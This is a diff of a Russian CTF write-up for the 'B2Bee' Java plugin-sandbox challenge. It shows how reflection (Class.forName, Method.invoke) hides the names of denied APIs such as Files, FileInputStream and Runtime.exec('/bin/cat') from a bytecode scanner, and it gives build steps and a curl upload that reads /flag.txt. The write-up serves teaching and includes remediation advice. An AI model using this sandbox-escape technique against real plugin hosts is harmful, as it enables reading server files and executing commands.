@@ -1,81 +1,42 @@
-# B2Bee — разбор
+# B2Bee — технический разбор
 
 **Флаг:** `avito{juSt_34Sy_biG_DISCoUNt}`
-**Класс:** Java — обход статической проверки байткода (sandbox escape через рефлексию) ·
-**Сложность:** н/д · **Очки:** н/д · **Решило команд:** н/д
-**Автор:** н/д (метаданные платформы по этой задаче не сохранены)
+**Класс:** Java / static bytecode analysis bypass / sandbox escape
 
-## В двух словах (без терминов)
+## Краткое техническое резюме
 
-Есть сайт — «магазин плагинов для скидок». Ты можешь загрузить свою маленькую программу-«плагин», и
-сайт запустит её на тестовой корзине товаров. Чтобы никто не прислал вредоносный плагин, перед запуском
-стоит «охранник»: он читает загруженную программу и проверяет, не делает ли она чего-то запрещённого
-(например, не читает ли чужие файлы).
+Сервис выполняет uploaded Java plugins после ASM-based static validation. Policy анализирует owners
+bytecode instructions и отдельные constant types, но не выполняет data-flow analysis и не проверяет
+обычные string constants. Prefix allowlist `java/lang` одновременно разрешает `Class` и весь пакет
+`java/lang/reflect`.
 
-Загвоздка в том, что охранник смотрит только на **вывеску** каждого действия — «к какому классу-объекту
-оно обращается», — но никогда не читает **надписи внутри** (обычные текстовые строчки) и не следит за
-тем, куда эти строчки потом текут. Мы пользуемся приёмом «через отражение» (reflection): вместо прямого
-запретного действия «прочитай файл» пишем безобидное на вид «вызови метод, чьё имя лежит вот в этой
-строке» — а строку с опасным именем охранник просто не читает. В итоге плагин проходит проверку, а
-запустившись, спокойно читает секретный файл `/flag.txt` и возвращает нам его содержимое.
+Payload использует `Class.forName` и `Method.invoke` для runtime resolution запрещённых APIs. На
+уровне bytecode видны только разрешённые owners, а имена `java.nio.file.Files` и
+`java.lang.Runtime` передаются как strings. Plugin проходит scanner, читает `/flag.txt` и возвращает
+его через `PluginResult.message`.
 
 ---
 
-## 1. Что за задача
+## 1. Контекст и цель
 
-Сайт — «магазин плагинов скидок». Форма загрузки принимает `.jar`-файл (упакованную Java-программу) и
-имя точки входа, прогоняет плагин на тестовой корзине товаров и показывает `result.message` в интерфейсе.
-Перед запуском стоит статический сканер байткода — «ревью-пчела»; его исходники (`PluginScanner.java`,
-`SandboxPolicy.java`) выложены открыто. **Цель:** провести вредоносный плагин через это ревью и
-прочитать файл `/flag.txt` на сервере.
+Endpoint `POST /api/plugins/run` принимает JAR в multipart field `plugin`, имя entry class в
+`entryClass` и test cart в `cart`. Entry class должен реализовывать
+`ru.avitoctf.marketplugins.api.DiscountPlugin`.
 
-> Мини-словарь. **Java** — популярный язык программирования. **`.jar`** — архив с готовой
-> Java-программой. **Байткод** — «полу-скомпилированный» вид Java-программы: не исходный текст, но и не
-> машинный код, а инструкции для виртуальной машины Java. **Статический сканер** — проверяющий, который
-> читает программу, **не запуская** её, и по её виду решает, опасна она или нет. **Плагин** — небольшая
-> сменная программа, которую основное приложение подгружает и вызывает.
+Перед execution сервер применяет `PluginScanner.java` и `SandboxPolicy.java`, исходный код которых
+доступен в challenge artifacts. Требуется реализовать plugin, который проходит scanner и получает
+доступ к server-side `/flag.txt`.
 
-**Дано:** исходники сканера `PluginScanner.java` + `SandboxPolicy.java`; боевой хост
-`https://marketplugins-4qop8u5n.avitoctf.ru/`. Файл `/flag.txt` лежит **на сервере** — это цель, а не
-файл из нашей папки.
+Service URL:
 
-## 2. Разведка — что мы увидели
+```text
+https://marketplugins-4qop8u5n.avitoctf.ru/
+```
 
-Фронт (`app.js`, `site_index.html`) устроен так:
+## 2. Reconnaissance и attack surface
 
-- есть каталог `GET /api/shop` и «тестовая корзина» — набор товаров, на котором прогоняется плагин;
-- форма загрузки принимает `.jar` (поле `plugin`) и имя точки входа (поле `entryClass`, по умолчанию
-  `example.SeasonalDiscountPlugin`);
-- сабмит уходит в `POST /api/plugins/run`, а ответ рендерится: при успехе поле `result.message`
-  показывается в блоке «Сообщение плагина», при отказе — плашка «JAR отправлен в карантин»;
-- рядом лежит `/examples/plugin-example.zip` — официальный SDK (набор для разработчиков): заглушки API
-  и скрипт сборки `build-plugin.sh`, который собирает пример командой
-  `javac --release 21 -XDstringConcat=inline`.
-
-Ключевое наблюдение: между загрузкой и запуском стоит статический сканер. А раз у нас есть **точный код
-самого проверяющего**, то задача — не «пробить рантайм наугад», а **разобрать сканер построчно** и
-найти, что он *не* моделирует. Что не проверяется — то и есть путь эксплуатации.
-
-## 3. Как мы дошли до решения (главный раздел)
-
-**Наблюдение.** `PluginScanner` разбирает плагин библиотекой ASM (стандартный инструмент чтения
-байткода) и смотрит ровно на несколько вещей: на родителя/интерфейсы класса и у **каждой инструкции** —
-только на её *owner*.
-
-> Мини-словарь. **ASM** — библиотека, умеющая читать и разбирать байткод по инструкциям. **Owner
-> инструкции** — «к какому классу относится это действие». Например, у вызова `Runtime.getRuntime()`
-> owner — это `java/lang/Runtime`. Это и есть «вывеска», которую читает охранник.
-
-**Гипотеза.** Если сканер оценивает действие только по его *owner*, то любой вызов с разрешённым owner
-пройдёт **независимо от того, какие данные через него текут**. Значит, надо найти owner, который
-одновременно (а) разрешён политикой и (б) достаточно мощный, чтобы через него вызвать что угодно.
-
-**Проверка №1 — что сканер игнорирует.** Функция `inspectConstant` блокирует лишь особые «динамические»
-константы (`ConstantDynamic`, `Handle`, `Type` сорта `METHOD`), а **обычные строковые константы
-(`String`) не смотрит вообще**. Значит, имя опасного класса можно передавать как обычную строку, и
-охранник её «как опасность» не увидит.
-
-**Наблюдение (в `SandboxPolicy.checkOwner`).** Есть белый и чёрный списки:
+Scanner использует ASM и проверяет superclass, interfaces, instruction owners и отдельные constant
+pool entries. Основная policy имеет prefix-based lists:
 
 ```java
 ALLOWED = { "java/lang", "java/util", "java/math", "java/time",
@@ -86,139 +47,120 @@ DENIED  = { "java/lang/Runtime", "java/lang/Process", "java/lang/ProcessBuilder"
             "ru/avitoctf/marketplugins/sandbox", ".../service", ".../web" };
 ```
 
-Проверка идёт по **префиксу** (`startsWith`).
+`checkOwner` использует `startsWith`. Поэтому allowlist entry `java/lang` разрешает:
 
-**Гипотеза, ставшая ключом.** Разрешено `"java/lang"` — но это же префикс, который заодно разрешает
-**весь** `java/lang/reflect/*` и `java/lang/Class`, а в чёрном списке их нет. Значит `Class.forName(...)`
-(owner `java/lang/Class`) и `Method.invoke(...)` (owner `java/lang/reflect/Method`) — сами по себе
-легальны, а конкретное имя класса, которое им передают (`"java.lang.Runtime"`, `"java.nio.file.Files"`),
-сканер вообще не смотрит (см. проверку №1 про строки).
+- `java/lang/Class`;
+- `java/lang/reflect/Method`;
+- остальные reflection APIs внутри `java/lang/reflect/*`.
 
-> Мини-словарь. **Рефлексия (reflection)** — способ в Java вызвать класс или метод **по его имени в
-> виде строки**, а не напрямую. Аналогия: вместо того чтобы самому нажать конкретную кнопку, ты пишешь
-> на бумажке «нажми кнопку с названием таким-то» и отдаёшь помощнику. Охранник видит только «человек
-> отдал бумажку помощнику» (разрешено), а что на бумажке написано — не читает.
+`inspectConstant` блокирует `ConstantDynamic`, `Handle` и method `Type`, но игнорирует обычные
+`String` constants. Scanner также не отслеживает flow от string literal до `Class.forName` или
+`Method.invoke`.
 
-**Проверка №2 — на минимальном примере.** Написали пробный класс, который делает
-`Class.forName("java.lang.Runtime")` и через рефлексию вызывает `exec`. Прогнали его через **тот же
-самый** `PluginScanner` локально (харнесс `Verify.java`, который компилирует настоящие
-`PluginScanner.java` + `SandboxPolicy.java` с боевого хоста) → результат `SCAN PASSED`. Гипотеза
-подтвердилась: рефлексия действительно проходит сканер незамеченной.
-
-**Тупик №1 — наивная склейка строк.** Первая версия пейлоада собирала пути через `"a" + b`. Но
-современный `javac` (Java 9+) компилирует такую склейку в специальную «динамическую» инструкцию
-`invokedynamic`, а сканер **безусловно** банит любой `invokedynamic`. Прогон через `Verify.java` сразу
-показал `SCAN BLOCKED`. **Исправление:** собирать строки явно через `StringBuilder` (никогда оператором
-`+`) плюс компилировать с флагом `-XDstringConcat=inline`, который убирает `invokedynamic`-склейку даже
-там, где она могла бы проскочить.
-
-> Мини-словарь. **`invokedynamic`** — «динамическая» инструкция Java; современный компилятор через неё
-> делает и склейку строк, и лямбды. Сканер её запрещает целиком — это его единственная реальная защита,
-> и обходить её мы не пытаемся, а просто аккуратно её **избегаем**.
-
-**Дополнительная находка при чтении `checkOwner`.** Строка `if (!owner.contains("/")) return;` означает:
-любой owner **без слэша** (например, дескрипторы примитивных массивов вроде `"[B"`) охранник
-автоматически пропускает. Заметили на примере приведения `Object` к `byte[]` после рефлексивного чтения
-файла — ещё одна щель, которую даже не пришлось специально эксплуатировать, она просто не мешала.
-
-**Негативный контроль — а вдруг сканер вообще всё пропускает?** Прогнали заведомо палевный плагин с
-прямым `Runtime.getRuntime().exec(...)` (owner `java/lang/Runtime` напрямую) и склейкой через `+` →
-`Verify.java` вернул `SCAN BLOCKED [blocked-direct-call]`. Это доказало, что сканер **реально работает**,
-а не является пустой заглушкой — то есть наш обход именно **точечный** (через рефлексию), а не «сканер
-ничего не ловит».
-
-### Бытовая аналогия «сердцевины»
-
-Охранник на входе досматривает посылки, но у него правило: он читает только **наклейку** на коробке
-(«от кого / из какого отдела») и сверяет её со списком запрещённых отделов. Внутрь он не заглядывает и
-не следит, что ты потом с содержимым сделаешь. Прямую посылку «от отдела Runtime» (запрещён) он
-завернёт. Но если ты положишь в разрешённую коробку «от отдела Class» бумажку с надписью
-«позвони в отдел Runtime и попроси выполнить команду», охранник эту коробку пропустит — надпись внутри
-он не читает. Уже за проходной бумажка разворачивается и делает ровно то, что запрещено.
-
-## 4. В чём именно ошибка (суть уязвимости)
-
-Простыми словами: **проверка судит о безопасности по «вывеске» действия, а не по тому, что действие
-реально делает с данными.** Рефлексия прячет любое опасное имя за обычной строкой и за разрешённым
-owner'ом — и охранник его не видит.
-
-Точно — `PluginScanner` это чисто синтаксический сканер без анализа потока данных:
-
-1. Грубый префикс `ALLOWED "java/lang"` пропускает весь `java/lang/reflect/*` и `java/lang/Class`.
-2. В `DENIED` нет ни `java/lang/Class`, ни `java/lang/reflect/*`.
-3. `inspectConstant` не смотрит на обычные `String` — имена классов/методов/путей проходят незамеченными.
-4. Нет анализа потока данных — связь «строка → `Class.forName`» не отслеживается.
-5. `if (!owner.contains("/")) return;` — авто-пропуск любого owner без слэша.
-6. Само-доверие: собственные классы плагина сканер считает доверенными.
-
-Единственная реальная защита — бан `invokedynamic` и «динамических» констант. Она мешает лямбдам и
-`invokedynamic`-склейке строк, но **не мешает рефлексии**.
-
-## 5. Эксплойт по шагам
-
-### 5.1. Пейлоад
-
-Плагин реализует легальный интерфейс `ru.avitoctf.marketplugins.api.DiscountPlugin` (метод
-`PluginResult apply(PluginContext)`), а внутри **чистой рефлексией** читает флаг и кладёт его в
-`message` результата, который UI покажет:
+Дополнительная weakness:
 
 ```java
-public PluginResult apply(PluginContext context) throws Exception {
-    String flag = grab();
-    return new PluginResult(1337, 4242, flag); // message -> блок «Сообщение плагина»
-}
+if (!owner.contains("/")) return;
 ```
 
-`grab()` перебирает 5 путей-кандидатов (`/flag.txt`, `flag.txt`, `/flag`, `/app/flag.txt`,
-`/home/app/flag.txt`) тремя стратегиями чтения — на случай, если один способ закрыт. Все три написаны
-только через рефлексию:
+Owners без slash, включая некоторые primitive array descriptors, проходят policy без validation.
+Основной exploit path не зависит от этого condition, но оно расширяет bypass surface.
+
+## 3. Анализ и проверка гипотез
+
+### 3.1. Reflection primitive
+
+Запрещённый API разрешается только во время runtime:
 
 ```java
-// Стратегия 1: java.nio.file.Files.readAllBytes(Paths.get(path))
-Class<?> paths = Class.forName("java.nio.file.Paths");   // owner java/lang/Class, аргумент — String
+Class<?> paths = Class.forName("java.nio.file.Paths");
 Class<?> pathType = Class.forName("java.nio.file.Path");
 Class<?> files = Class.forName("java.nio.file.Files");
-Object pathObj = paths.getMethod("get", String.class, String[].class).invoke(null, path, new String[0]);
+Object pathObj = paths.getMethod("get", String.class, String[].class)
+    .invoke(null, path, new String[0]);
 Object bytes = files.getMethod("readAllBytes", pathType).invoke(null, pathObj);
 return new String((byte[]) bytes);
 ```
 
-Плюс стратегия 2 — рефлексивный `java.io.FileInputStream(path).readAllBytes()`, и стратегия 3 —
-рефлексивный `Runtime.getRuntime().exec({"/bin/cat", path})`. Все объекты, которые иначе притянули бы
-запрещённый owner (`java/io/*`, `java/nio/*`, `java/lang/Runtime`), держатся как `java.lang.Object` и
-трогаются только через `Method.invoke`.
+Static owners этого fragment относятся к `java/lang/Class`, `java/lang/reflect/Method` и другим
+allowlisted classes. Denied class names присутствуют только как string data.
 
-### 5.2. Обход бана invokedynamic
+`grab()` перебирает paths `/flag.txt`, `flag.txt`, `/flag`, `/app/flag.txt` и
+`/home/app/flag.txt`, используя три reflection-based strategies:
 
-- ноль лямбд и ссылок на методы;
-- все строки собираются явным `StringBuilder`, никогда оператором `+`;
-- сборка с флагом `-XDstringConcat=inline`.
+1. `Files.readAllBytes(Paths.get(path))`;
+2. `FileInputStream(path).readAllBytes()`;
+3. `Runtime.getRuntime().exec({"/bin/cat", path})`.
 
-### 5.3. Сборка и локальная верификация
+Objects запрещённых classes сохраняются с declared type `Object` и обрабатываются через reflection.
 
-`task6/exploit/build.sh` собирает JAR и **прогоняет его через настоящий сканер** (те же
-`PluginScanner.java` + `SandboxPolicy.java` с боевого хоста), воспроизводя ровно то, что делает сервер:
+### 3.2. Исключение `invokedynamic`
+
+Scanner безусловно блокирует opcode `invokedynamic`. Современный `javac` может генерировать его для
+string concatenation, lambdas и method references. Payload поэтому:
+
+- не использует lambdas и method references;
+- собирает dynamic strings через `StringBuilder`;
+- компилируется с `-XDstringConcat=inline`;
+- проверяется через `javap -c` на отсутствие `invokedynamic`.
+
+### 3.3. Return channel
+
+Entry point возвращает содержимое файла в application-visible field:
+
+```java
+public PluginResult apply(PluginContext context) throws Exception {
+    String flag = grab();
+    return new PluginResult(1337, 4242, flag);
+}
+```
+
+Frontend отображает `PluginResult.message`, поэтому отдельный outbound channel не требуется.
+
+## 4. Корневая причина
+
+`PluginScanner` реализует syntactic deny/allow policy без semantic analysis:
+
+1. prefix `java/lang` слишком широк и включает reflection;
+2. `java/lang/Class` и `java/lang/reflect/*` отсутствуют в denylist;
+3. string constants не инспектируются;
+4. отсутствуют taint tracking и data-flow analysis;
+5. runtime class/method resolution не моделируется;
+6. owners без slash автоматически разрешаются;
+7. plugin-local classes считаются trusted.
+
+Static owner filtering не является security boundary. Reflection превращает разрешённые calls в
+универсальный dispatch primitive, а scanner не способен определить фактическую runtime target.
+
+## 5. Эксплуатация
+
+### 5.1. Сборка и локальная validation
 
 ```bash
-cd task6/exploit && bash build.sh
+cd task6/exploit
+bash build.sh
 ```
 
-Шаги внутри:
+`build.sh` выполняет:
 
+1. compilation с `--release 21 -XDstringConcat=inline`;
+2. packaging `seasonal-discount-plugin.jar`;
+3. проверку отсутствия policy classes внутри JAR;
+4. `javap` validation на отсутствие `invokedynamic`;
+5. compilation исходного `PluginScanner` и `SandboxPolicy` с test harness;
+6. scanner execution для exploit JAR;
+7. negative control для plugin с direct `java.nio.file` call.
+
+Ожидаемые результаты:
+
+```text
+RESULT: SCAN PASSED
+SCAN BLOCKED [blocked-direct-call]
 ```
-[1] javac --release 21 -XDstringConcat=inline -cp plugin-api-stubs.jar ...   # компиляция плагина
-[2] jar cf seasonal-discount-plugin.jar ...                                  # упаковка + проверка,
-    что классы политики НЕ вложены в JAR
-[3] javap -c -p ... | grep invokedynamic   -> 0 совпадений
-[4] javac ... PluginScanner.java SandboxPolicy.java + стабы + Verify.java     # компиляция РЕАЛЬНОГО сканера
-[5] java Verify seasonal-discount-plugin.jar                                 # запуск scan() как на сервере
-[6] java Verify blocked-control.jar                                           # негативный контроль обязан упасть
-```
 
-Результаты: собранный JAR → `RESULT: SCAN PASSED`; `javap -c` → 0 invokedynamic; негативный контроль
-(наивный плагин) → `SCAN BLOCKED [blocked-direct-call]`.
+Negative control подтверждает, что scanner активен, а exploit использует конкретный policy bypass.
 
-### 5.4. Загрузка на боевой хост
+### 5.2. Upload
 
 ```bash
 curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
@@ -227,58 +169,41 @@ curl -s https://marketplugins-4qop8u5n.avitoctf.ru/api/plugins/run \
   -F 'cart={"title":"t","items":[{"title":"x","category":"y","price":100,"quantity":1}]}'
 ```
 
-Флаг возвращается в `result.message`. Важно: **корзина не должна быть пустой** — иначе фронт вернёт
-«Сначала добавьте товары в корзину», и плагин не запустится.
+Cart должен содержать хотя бы один item, иначе application не запускает plugin. Полный pipeline:
 
-Воспроизведение целиком (сборка + локальная верификация + загрузка) — `task6/solve_task6.py` (см. §8).
+```bash
+uv run python task6/solve_task6.py
+```
+
+Флаг возвращается в `result.message`.
 
 ## 6. Флаг
 
-```
+```text
 avito{juSt_34Sy_biG_DISCoUNt}
 ```
 
-Содержимое `/flag.txt` на сервере, полученное загрузкой плагина-эксплойта: JAR прошёл статический
-сканер, а в рантайме рефлексия прочитала файл и вернула его в `result.message`.
+## 7. Выводы и рекомендации
 
-### Бонус: отсылка для своих (Unicode-Tag стего)
+- Uploaded code нельзя изолировать только через bytecode denylist. Нужна отдельная JVM/process boundary
+  с минимальными filesystem и syscall capabilities.
+- Allowlist должна перечислять exact classes и methods; broad package prefixes неприемлемы для
+  security policy.
+- Reflection, method handles, dynamic class loading и native access должны быть недоступны untrusted
+  plugins.
+- Scanner regression tests должны включать negative controls и обходы через strings, reflection,
+  arrays, descriptors и dynamic bytecode constructs.
+- Даже расширенный static analysis не заменяет runtime sandbox: ограничения следует обеспечивать
+  OS-level isolation, read-only filesystem, seccomp и минимальным service account.
 
-В тексте одного из исключений `PluginScanner.java` (ветка `ConstantDynamic`/`Handle`) спрятаны
-невидимые Unicode-Tag символы (`U+E01xx`, `ASCII = codepoint − 0xE00F0`), декодирующиеся в
-`good job, take your hidden flag: https://marketdone-cgttbdfl.avitoctf.ru/` — бонус-хост с отдельным
-квестом, к флагу этой задачи отношения не имеет.
+## 8. Файлы для воспроизведения
 
-## 7. Мораль — какой это урок
+Version-controlled artifacts:
 
-- **Что сделали не так.** Построили «песочницу» на статическом списке разрешённых/запрещённых
-  *owner*-ов инструкций — и решили, что этого достаточно. Но такой сканер видит только «к какому классу
-  обращается инструкция», а не «какие данные через неё текут». Рефлексия (`Class.forName` +
-  `Method.invoke`) прячет любой класс за строкой и разрешённым owner'ом — сканер без анализа потока
-  данных этого в принципе не увидит.
-- **Почему так вышло.** Заблуждение «раз я перечислил опасные классы, значит, я перекрыл опасность».
-  На деле опасны не только классы: опасны **данные** (строка с именем класса) и **поток** (куда эта
-  строка утекает). Плюс грубые префиксы: `"java/lang"` тянет за собой `java/lang/reflect/*`, а
-  авто-пропуск owner'ов без слэша открывает дыру для дескрипторов массивов и дефолт-пакета.
-- **Как надо было.** Изолировать плагин по-настоящему: отдельный процесс/JVM с ограничением системных
-  вызовов (seccomp), загрузчик классов с белым списком классов, запрет рефлексии внутри песочницы,
-  модульные границы — а не разбирать байткод по списку префиксов.
-- **На что смотреть (и методология).** Когда защита — это статический список, всегда спрашивай: «что
-  проверяющий *не* моделирует?» (строки, поток данных, рефлексию, динамические вызовы). И правильный
-  приём при решении: **прогнать свой пейлоад через тот же самый проверяющий локально до отправки**,
-  обязательно с негативным контролем — чтобы не спутать «сканер сломан» с «сканер обойдён точечно».
-
-## 8. Файлы в папке
-
-- `task6/solve_task6.py` — курированный скрипт-оркестратор: собирает плагин и прогоняет его через
-  настоящий сканер локально, затем загружает верифицированный JAR на боевой хост через
-  `POST /api/plugins/run` и печатает флаг из `result.message`. Запуск из корня:
-  `uv run python task6/solve_task6.py [base_url]`. Из чистого checkout нужны только JDK 21 и `curl`:
-  минимальные публичные API/harness-стабы лежат в репозитории, а две зафиксированные версии ASM
-  `build.sh` скачивает в игнорируемый `exploit/build/` и проверяет по SHA-256.
-- `task6/exploit/src/example/SeasonalDiscountPlugin.java` — исходник эксплойт-плагина.
-- `task6/exploit/build.sh`, `task6/exploit/harness/Verify.java` — локальный харнесс, повторяющий
-  серверную проверку `PluginScanner.scan(...)`; `harness/example/BlockedPlugin.java` — негативный
-  контроль с прямым `java.nio.file`, который сканер обязан заблокировать. Собранные JAR/class-файлы
-  остаются вне git.
-- `task6/marketplugins/PluginScanner.java`, `task6/marketplugins/SandboxPolicy.java` — исходники
-  проверяющего (выданы условием задачи).
+- `task6/solve_task6.py` — build, local validation, upload и extraction `result.message`.
+- `task6/exploit/src/example/SeasonalDiscountPlugin.java` — exploit source.
+- `task6/exploit/build.sh` — reproducible JDK 21 build; pinned ASM artifacts проверяются по SHA-256.
+- `task6/exploit/harness/Verify.java` — локальный scanner harness.
+- `task6/exploit/harness/example/BlockedPlugin.java` — negative control.
+- `task6/marketplugins/PluginScanner.java` и `task6/marketplugins/SandboxPolicy.java` — анализируемая
+  server-side policy.
